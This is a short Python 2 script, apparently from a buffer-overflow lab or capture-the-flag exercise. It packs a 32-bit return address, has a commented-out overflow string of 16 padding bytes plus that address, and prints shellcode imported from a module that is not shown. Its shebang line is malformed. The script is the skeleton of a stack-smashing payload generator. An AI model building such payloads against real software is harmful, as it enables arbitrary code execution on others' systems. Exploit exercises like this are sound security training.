#!/user/bin/bash/python

from struct import pack
from shellcode import shellcode

addr = pack("<I", 0x804889c)
# print("A"*16 + addr)

print shellcode
